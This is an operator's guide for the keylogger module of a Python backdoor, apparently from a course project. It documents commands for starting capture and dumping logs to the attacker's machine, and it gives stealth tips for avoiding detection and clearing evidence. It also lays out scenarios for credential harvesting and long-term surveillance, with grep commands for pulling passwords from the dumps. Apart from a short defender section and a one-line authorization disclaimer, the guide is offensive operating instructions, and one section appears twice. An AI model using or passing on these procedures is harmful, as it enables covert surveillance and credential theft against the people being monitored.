# Keylogger Implementation Guide

## Overview

The keylogger feature captures all keystrokes typed by the user on the target machine, logging them with timestamps for later analysis.

## Implementation Details

### Architecture

- **Module**: `features/keylogger.py`
- **Classes**:
  - `Keylogger` - Full-featured keylogger using pynput
  - `FallbackKeylogger` - Basic keylogger without external dependencies
- **Log Directory**: `logs/keylog/`
- **Log File**: `keylog.txt`

### How It Works

1. **Key Capture**: Uses pynput library to intercept keyboard events
2. **Buffering**: Keys are stored in memory buffer before writing to disk
3. **Auto-Save**: Automatically saves buffer every 50 keystrokes or on Enter key
4. **Timestamping**: Each log entry includes timestamp for timeline reconstruction

### Key Processing Logic

```python
Regular Keys → Logged as-is (a, b, c, 1, 2, 3)
Space → Space character
Enter → New line + auto-save trigger
Tab → Tab character
Backspace → Removes last character from buffer
Special Keys → Logged in brackets [SHIFT], [CTRL], [ALT]
```

## Commands Reference

### Start Keylogger

```bash
keylog_start
```

**What happens:**

- Initializes keylogger thread
- Starts capturing keystrokes
- Creates log file if doesn't exist
- Returns confirmation message

**Response:**

```
[+] Keylogger started successfully
```

**Use case:**

- Start before user begins typing
- Capture login credentials
- Monitor user activity

---

### Stop Keylogger

```bash
keylog_stop
```

**What happens:**

- Stops the keylogger thread
- Saves any buffered keystrokes
- Closes log file properly
- Returns confirmation

**Response:**

```
[+] Keylogger stopped successfully
```

**Use case:**

- Stop monitoring after capturing target data
- Before exiting backdoor connection
- To reduce detection risk

---

### Dump Keylog (Auto-Download)

```bash
keylog_dump
```

**What happens:**

1. Saves any buffered content to log file
2. Reads the log file from target
3. Automatically transfers to attacker machine
4. Saves as `keylog_dump_YYYYMMDD_HHMMSS.txt`
5. Displays content in terminal

**Response:**

```
Keylog file ready: logs/keylog/keylog.txt
[*] Downloading keylog file...
[+] Keylog file downloaded: keylog_dump_20251004_143022.txt

=== Keylog Content ===
[2025-10-04 14:25:12] username@email.com
[2025-10-04 14:25:45] password123
[2025-10-04 14:26:10] ssh root@192.168.1.100
=== End of Keylog ===
```

**Use case:**

- Retrieve captured credentials
- Download evidence of user activity
- Analyze typing patterns
- Extract sensitive information

**File location:**

- Target: `logs/keylog/keylog.txt`
- Attacker: `logs/keylog/keylog_dump_20251004_143022.txt`

---

### Check Status

```bash
keylog_status
```

**What happens:**

- Queries keylogger status
- Returns JSON with current state
- Shows buffer and file information

**Response:**

```json
{
  "running": true,
  "log_file": "logs/keylog/keylog.txt",
  "buffer_size": 42,
  "file_size": 1024,
  "pynput_available": true
}
```

**Fields explained:**

- `running`: Is keylogger actively capturing?
- `log_file`: Path to log file on target
- `buffer_size`: Characters in memory buffer
- `file_size`: Size of log file in bytes
- `pynput_available`: Is pynput library available?

---

### Clear Logs

```bash
keylog_clear
```

**What happens:**

- Deletes the log file
- Clears the memory buffer
- Creates new empty log file
- Returns confirmation

**Response:**

```
[+] Keylog file cleared
```

**Use case:**

- Remove old logs before new session
- Clean up evidence
- Start fresh capture session

---

### Manual Logging (Fallback Mode)

```bash
keylog_manual <text>
```

**What happens:**

- Manually logs text to keylog file
- Used when pynput is not available
- Adds timestamp automatically

**Example:**

```bash
keylog_manual user typed: admin password123
```

**Response:**

```
[+] Manually logged: user typed: admin password123
```

**Use case:**

- When pynput cannot be installed
- For testing purposes
- Simulating keystrokes

---

### Manual Logging (Fallback Mode)

```bash
keylog_manual <text>
```

**What happens:**

- Manually logs text to keylog file
- Used when pynput is not available
- Adds timestamp automatically

**Example:**

```bash
keylog_manual user typed: admin password123
```

**Response:**

```
[+] Manually logged: user typed: admin password123
```

**Use case:**

- When pynput cannot be installed
- For testing purposes
- Simulating keystrokes

## Log File Format

### Structure

```
[YYYY-MM-DD HH:MM:SS] captured text here
[YYYY-MM-DD HH:MM:SS] more captured text
```

### Example

```
[2025-10-04 14:25:12] Hello World
[2025-10-04 14:25:45] username: admin
[2025-10-04 14:26:10] password: SecurePass123!
[2025-10-04 14:26:45] ssh root@192.168.1.100
[2025-10-04 14:27:22] sudo apt-get install malware
```

## Troubleshooting

### Issue 1: "Keylogger feature not available"

**Cause:** pynput library not installed

**Solution:**

```bash
pip3 install pynput
```

**On target machine:**

```bash
cd /tmp/DES484_Backdoor
pip3 install pynput
```

---

### Issue 2: Keylogger starts but captures nothing

**Causes:**

1. No keyboard activity
2. Permission issues
3. Display environment not set

**Solutions:**

**Linux/macOS:**

```bash
# Set display environment
export DISPLAY=:0

# Run with proper permissions
sudo python3 backdoor.py
```

**macOS specific:**

```
System Preferences > Security & Privacy > Privacy > Accessibility
Add Terminal or Python to allowed apps
```

**Windows:**

```
Run as Administrator if needed
```

---

### Issue 3: "Permission denied" on log file

**Cause:** No write permissions to logs directory

**Solution:**

```bash
# Create logs directory with proper permissions
mkdir -p logs/keylog
chmod 755 logs/keylog

# Or run with appropriate permissions
sudo python3 backdoor.py
```

---

### Issue 4: Keylogger captures garbled text

**Cause:** Encoding issues or special characters

**Solution:**

- This is normal for special keys
- Check log file encoding (should be UTF-8)
- Special keys show as [KEY_NAME]

---

### Issue 5: Auto-save not working

**Cause:** Buffer size not reached or Enter not pressed

**Solution:**

- Type at least 50 characters
- Press Enter to trigger auto-save
- Stop keylogger to force save
- Use `keylog_dump` which triggers save

---

### Issue 6: Downloaded file is empty

**Causes:**

1. Keylogger just started (no data yet)
2. No keyboard activity occurred
3. Buffer not saved to disk

**Solutions:**

```bash
# Check status first
keylog_status

# If buffer_size > 0 but file_size = 0:
keylog_stop  # Force save
keylog_dump  # Then download
```

---

### Issue 7: Import error on Linux

**Error:**

```
ImportError: No module named 'pynput'
```

**Solution:**

```bash
# Install for current user
pip3 install --user pynput

# Or install globally
sudo pip3 install pynput

# Or use virtual environment
python3 -m venv venv
source venv/bin/activate
pip install pynput
```

## Limitations

### Technical Limitations

1. **Pynput Dependency**

   - Requires pynput library for full functionality
   - Fallback mode has limited features
   - May not work in all terminal environments

2. **Special Keys**

   - Some special key combinations may not be captured
   - Function keys logged as [F1], [F2], etc.
   - Modifier keys logged separately

3. **Performance**

   - Buffer may fill up with heavy typing
   - Auto-save can cause brief delays
   - File I/O operations block temporarily

4. **Platform Differences**
   - macOS requires Accessibility permissions
   - Linux requires X11 display environment
   - Windows may need Administrator rights

### Detection Risks

1. **Process Monitoring**

   - Keylogger shows as Python process
   - Can be detected by task managers
   - Antivirus may flag behavior

2. **File System**

   - Log files visible in filesystem
   - Creates logs/keylog/ directory
   - File grows over time

3. **System Resources**
   - Uses memory for buffer
   - Background thread consumes CPU
   - Disk I/O for log writes

### Functional Limitations

1. **Text Only**

   - Only captures keyboard input
   - No mouse movements or clicks
   - No clipboard content (use clipboard_stealer)

2. **No Context**

   - Doesn't know which application received input
   - No window title capture
   - No screenshot association

3. **Timing**
   - May miss rapid key sequences
   - Backspace only removes from buffer, not log
   - No keystroke timing analysis

## Best Practices

### 1. Timing

```bash
# Start keylogger early
keylog_start

# Let it run during user session
# Check periodically
keylog_status

# Download when sufficient data captured
keylog_dump

# Stop when done
keylog_stop
```

### 2. Stealth

```bash
# Start monitoring silently
keylog_start

# Don't check status too often
# Let it accumulate data

# Download once at end of session
keylog_dump

# Clean up
keylog_clear
keylog_stop
```

### 3. Data Management

```bash
# Download regularly to avoid data loss
keylog_dump  # Creates timestamped file

# Each dump creates new file
# Old downloads preserved
# Prevents data loss if connection drops
```

### 4. Error Handling

```bash
# Always check status before dump
keylog_status

# If running=false but should be:
keylog_start

# If buffer_size > 0:
keylog_dump  # Save before data loss

# Always stop cleanly
keylog_stop
```

## Attack Scenarios

### Scenario 1: Credential Harvesting

```bash
# 1. Start keylogger before user logs in
keylog_start

# 2. Wait for user to type credentials
# User types username and password

# 3. Download captured credentials
keylog_dump

# 4. Analyze for credentials
grep -i "password\|login\|user" keylog_dump_*.txt
```

### Scenario 2: Command Monitoring

```bash
# 1. Start monitoring
keylog_start

# 2. User works with terminal/shell
# Captures all commands executed

# 3. Download after session
keylog_dump

# 4. Extract sensitive commands
grep -i "ssh\|mysql\|sudo\|password" keylog_dump_*.txt
```

### Scenario 3: Long-term Surveillance

```bash
# 1. Start keylogger
keylog_start

# 2. Let it run for extended period
# Captures days/weeks of activity

# 3. Periodic downloads
keylog_dump  # Daily or weekly

# 4. Analyze accumulated data
# Build profile of user behavior
```

## Performance Optimization

### Memory Usage

- Buffer size: ~50 characters
- Minimal memory footprint
- Auto-save prevents buffer overflow

### CPU Usage

- Idle when no keys pressed
- Minimal processing per keystroke
- Background thread lightweight

### Disk Usage

- Log file grows with usage
- Typical size: 1-10 KB per session
- Auto-save prevents data loss

## Security Considerations

### For Attackers

- Use stealth mode (don't check status often)
- Download and delete logs regularly
- Stop keylogger when not needed
- Clear logs before disconnecting

### For Defenders

- Monitor for suspicious Python processes
- Check for logs/keylog directory
- Monitor file system changes
- Use security software
- Restrict Accessibility permissions (macOS)

## Summary

The keylogger is a powerful feature that:
✅ Captures all keyboard input
✅ Auto-downloads to attacker machine
✅ Logs with timestamps
✅ Works across platforms
✅ Has graceful fallback mode

Use responsibly and only in authorized testing environments.
